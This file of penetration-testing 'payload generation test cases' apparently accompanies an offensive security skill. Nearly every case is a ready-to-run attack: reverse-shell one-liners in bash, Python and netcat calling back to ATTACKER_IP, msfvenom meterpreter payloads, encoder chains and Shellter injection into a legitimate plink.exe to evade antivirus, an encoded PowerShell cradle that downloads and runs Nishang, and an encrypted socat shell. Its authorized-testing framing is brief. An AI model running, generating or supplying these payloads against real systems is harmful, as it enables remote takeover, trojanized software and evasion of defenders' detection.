# Payload Generation Test Cases

> This file is a companion to `SKILL.md`, providing structured payload generation test case templates.
> Purpose: Check each item during payload generation testing to ensure no critical test points are missed. Each case includes prerequisites, steps, expected results, and severity level.
> All tests are intended solely for authorized security assessments.

---

## Test Case Format

```
TC-PG-XXX | [Category] Test Name
Severity: CRITICAL / HIGH / MEDIUM / LOW
Prerequisites: Conditions that must be met before testing
Test Steps: Specific operations
Expected Results: Observable behavior when the vulnerability exists
Reference Payload: Corresponding section in payloads.md
```

---

## Index

- [A. Reverse Shell Generation](#a-reverse-shell-generation)
- [B. msfvenom Payload Engineering](#b-msfvenom-payload-engineering)
- [C. Encoding and Evasion](#c-encoding-and-evasion)
- [D. Shell Stabilization](#d-shell-stabilization)
- [E. Platform-Specific Payloads](#e-platform-specific-payloads)

---

## A. Reverse Shell Generation

### TC-PG-001 | Basic Reverse Shell Generation and Listener Connectivity

- **Severity**: CRITICAL
- **Prerequisites**: Target allows outbound TCP connection to attacker IP, one of (bash/python/perl/php/nc) is available on target
- **Test Steps**:
  1. Start netcat listener on attacker: `nc -lvnp 4444`
  2. Execute Bash reverse shell on target: `bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1`
  3. Verify interactive shell received on listener
  4. If bash fails, try Python: `python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("ATTACKER_IP",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"])'`
  5. If Python fails, try Netcat: `nc -e /bin/sh ATTACKER_IP 4444`
  6. If nc lacks -e flag, try mkfifo method: `rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP 4444 > /tmp/f`
  7. Execute `id && whoami && hostname` on received shell to confirm access level
- **Expected Results**: Interactive shell session received on attacker listener with target system command output (user ID, hostname, current directory)
- **Reference**: payloads.md §1 Reverse Shells — One-Liners

### TC-PG-002 | Staged vs Stageless Payload Comparison

- **Severity**: HIGH
- **Prerequisites**: msfvenom installed, metasploit framework available for multi/handler, target system (Windows or Linux) accessible for testing
- **Test Steps**:
  1. Generate staged payload: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o staged.exe`
  2. Generate stageless payload: `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o stageless.exe`
  3. Compare file sizes: `ls -la staged.exe stageless.exe`
  4. Start multi/handler for staged payload: `msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST ATTACKER_IP; set LPORT 4444; exploit"`
  5. Execute staged.exe on target, verify meterpreter session established
  6. Start netcat listener: `nc -lvnp 4445`
  7. Execute stageless.exe on target pointing to port 4445
  8. Compare: does stageless payload work with plain netcat listener?
- **Expected Results**: Staged payload is significantly smaller (~15KB) but requires multi/handler; stageless payload is larger (~200KB+) but works with any TCP listener. Both establish working sessions when paired with correct listeners.
- **Reference**: payloads.md §2 msfvenom Payload Generation — Staged vs Stageless Reference

---

## B. msfvenom Payload Engineering

### TC-PG-003 | msfvenom Encoding with shikata_ga_nai and Multi-Encoder Chains

- **Severity**: HIGH
- **Prerequisites**: msfvenom installed, AV test environment (e.g., VirusTotal for hash comparison only — do not submit actual operational payloads to public services), target Windows system
- **Test Steps**:
  1. Generate unencoded baseline payload: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o baseline.exe`
  2. Generate single-encoded payload (5 iterations): `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -e x64/shikata_ga_nai -i 5 -f exe -o encoded5.exe`
  3. Generate multi-encoder chain payload:
     ```bash
     msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 \
       -e x64/shikata_ga_nai -i 3 -f raw | \
       msfvenom -p - -e x64/zutto_dekiru -i 3 -f exe -o chain.exe
     ```
  4. Generate payload excluding bad characters: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -b '\x00\x0a\x0d' -f exe -o badchar.exe`
  5. Start listener: `nc -lvnp 4444`
  6. Execute each payload variant on target and verify connectivity
  7. Compare AV detection rates across variants in isolated test environment
- **Expected Results**: Unencoded baseline is most likely detected by AV. Single-encoded with 5 iterations improves evasion. Multi-encoder chain provides best evasion. All functional variants connect to listener successfully.
- **Reference**: payloads.md §3 Encoding and Evasion

---

## C. Encoding and Evasion

### TC-PG-004 | Shellter PE Injection into Legitimate Executable

- **Severity**: HIGH
- **Prerequisites**: Shellter installed (`apt install shellter`), a legitimate Windows PE file available (e.g., plink.exe, putty.exe, sysinternals tools), AV test environment
- **Test Steps**:
  1. Copy legitimate executable to working directory: `cp /usr/share/windows-binaries/plink.exe /tmp/test_plink.exe`
  2. Generate raw shellcode: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f raw -o /tmp/shellcode.bin`
  3. Run shellter in auto mode: `shellter -i -f /tmp/test_plink.exe -p 1 -lhost ATTACKER_IP -lport 4444`
  4. Start listener: `nc -lvnp 4444`
  5. Execute injected plink.exe on target Windows system
  6. Verify shell session received
  7. Verify the original executable still appears functional (PE structure preserved)
- **Expected Results**: Injected executable maintains original file icon and metadata. Execution triggers reverse shell connection to attacker listener. AV detection rate is lower than standalone msfvenom payload because shellcode is embedded within legitimate PE structure.
- **Reference**: payloads.md §3 Shellter PE Injection

---

## D. Shell Stabilization

### TC-PG-005 | Shell Stabilization with rlwrap and PTY Upgrade

- **Severity**: MEDIUM
- **Prerequisites**: Active reverse shell session received on netcat listener, Python3 installed on target Linux system, attacker terminal supports raw mode
- **Test Steps**:
  1. Start listener with rlwrap: `rlwrap nc -lvnp 4444`
  2. Catch reverse shell from target
  3. Test raw shell limitations: press arrow keys (should show escape sequences), press Ctrl+C (should kill shell)
  4. Spawn PTY on target: `python3 -c 'import pty; pty.spawn("/bin/bash")'`
  5. Background the shell: press Ctrl+Z
  6. Configure attacker terminal: `stty raw -echo; fg`
  7. Press Enter twice to resume shell
  8. Set terminal environment: `export TERM=xterm; stty rows 38 cols 136`
  9. Test stabilized shell: press arrow keys (should show command history), press Tab (should autocomplete), run `su -` (should accept password interactively)
- **Expected Results**: Raw shell has no arrow key support, tab completion, or Ctrl+C resilience. After PTY upgrade, shell behaves like a full SSH session with history, autocomplete, interactive programs (nano, su, ssh), and Ctrl+C sends SIGINT to running process rather than killing the shell.
- **Reference**: payloads.md §5 Shell Stabilization

---

## E. Platform-Specific Payloads

### TC-PG-006 | Nishang PowerShell Reverse Shell for Windows Target

- **Severity**: CRITICAL
- **Prerequisites**: Windows target with PowerShell available, nishang repository accessible (local HTTP server or pre-staged), outbound TCP allowed from target
- **Test Steps**:
  1. Start netcat listener on attacker: `nc -lvnp 4444`
  2. Host nishang script on attacker HTTP server: `python3 -m http.server 8080` (serving from nishang/Shells/ directory)
  3. On target Windows system, execute PowerShell download cradle:
     ```powershell
     powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:8080/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress ATTACKER_IP -Port 4444"
     ```
  4. Verify shell session received on listener
  5. Test shell functionality: `whoami; hostname; ipconfig; systeminfo | findstr /B /C:"OS"`
  6. Encode the delivery command for evasion:
     ```bash
     # On attacker (Linux), encode PowerShell command
     CMD="IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:8080/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress ATTACKER_IP -Port 4444"
     ENCODED=$(echo -n "$CMD" | iconv -t utf-16le | base64 -w0)
     echo "powershell -nop -enc $ENCODED"
     ```
  7. Execute encoded variant on target and verify session
- **Expected Results**: PowerShell reverse shell established. `whoami` returns current Windows user. Encoded variant bypasses basic string-based detection while producing identical functional result. Shell provides full PowerShell environment (not limited cmd.exe).
- **Reference**: payloads.md §6 Nishang PowerShell Payloads

### TC-PG-007 | Socat Encrypted Reverse Shell

- **Severity**: HIGH
- **Prerequisites**: Socat available on both attacker and target, openssl installed on attacker for certificate generation, target allows outbound HTTPS/TLS connections
- **Test Steps**:
  1. Generate TLS certificate on attacker:
     ```bash
     openssl req -newkey rsa:2048 -nodes -keyout bind.key -x509 -days 365 -out bind.crt
     cat bind.key bind.crt > bind.pem
     ```
  2. Start encrypted listener on attacker:
     ```bash
     socat OPENSSL-LISTEN:4443,cert=bind.pem,verify=0 FILE:`tty`,raw,echo=0
     ```
  3. On target, connect with encrypted socat:
     ```bash
     socat OPENSSL:ATTACKER_IP:4443,verify=0 EXEC:'bash -li',pty,stderr,setsid,sigint,sane
     ```
  4. Verify encrypted shell session with PTY support
  5. Run `tshark -i eth0 -f "tcp port 4443" -c 10` on a monitoring point to verify traffic is TLS encrypted (should show encrypted payload, not plaintext commands)
  6. Compare with unencrypted netcat session captured via tshark (should show plaintext commands)
- **Expected Results**: Encrypted shell establishes full PTY session over TLS. Network capture shows encrypted TLS traffic with no visible plaintext commands. Shell provides full interactive terminal (history, tab completion, Ctrl+C resilience). The `verify=0` flag on target allows connection without validating the self-signed certificate.
- **Reference**: payloads.md §7 Socat Encrypted Shells

---

## Test Case Statistics

| Category | Cases | CRITICAL | HIGH | MEDIUM | LOW |
|----------|-------|----------|------|--------|-----|
| A. Reverse Shell Generation | 2 | 1 | 1 | 0 | 0 |
| B. msfvenom Payload Engineering | 1 | 0 | 1 | 0 | 0 |
| C. Encoding and Evasion | 1 | 0 | 1 | 0 | 0 |
| D. Shell Stabilization | 1 | 0 | 0 | 1 | 0 |
| E. Platform-Specific Payloads | 2 | 1 | 1 | 0 | 0 |
| **Total** | **7** | **2** | **4** | **1** | **0** |

---

## F. Post-Exploitation Payload Handling

### TC-PG-008 | Payload Obfuscation and Antivirus Evasion Verification

- **Severity**: HIGH
- **Prerequisites**: msfvenom installed with multiple encoders available; target AV test environment with real-time protection enabled; access to no-distribution sandbox for testing (e.g., any.run private mode)
- **Objective**: Verify that payload obfuscation techniques reduce AV detection rates while maintaining functionality, and document the evasion effectiveness of each technique
- **Test Steps**:
  1. Generate baseline payload without encoding: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o baseline.exe`
  2. Apply shikata_ga_nai with 5 iterations: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -e x64/shikata_ga_nai -i 5 -f exe -o encoded5.exe`
  3. Create multi-encoder chain: pipe through two encoders sequentially
  4. Test each variant in isolated sandbox environment
  5. Record detection rates and compare across variants
  6. Verify all functional variants successfully connect to listener
- **Expected Results**: Baseline payload has highest detection rate; single-encoder with 5 iterations shows reduced detection; multi-encoder chain provides best evasion; all functional payloads establish reverse shell connection
- **Remediation**: Deploy behavioral and heuristic detection alongside signature-based AV; enable AMSI for script content scanning; use application allowlisting to restrict unauthorized executables
- **Pass Criteria**: At least one obfuscated payload achieves detection rate below 15/70 in sandbox; all functional payloads successfully connect to listener; obfuscation does not corrupt payload functionality
- **Reference**: payloads.md Section 3 Encoding and Evasion
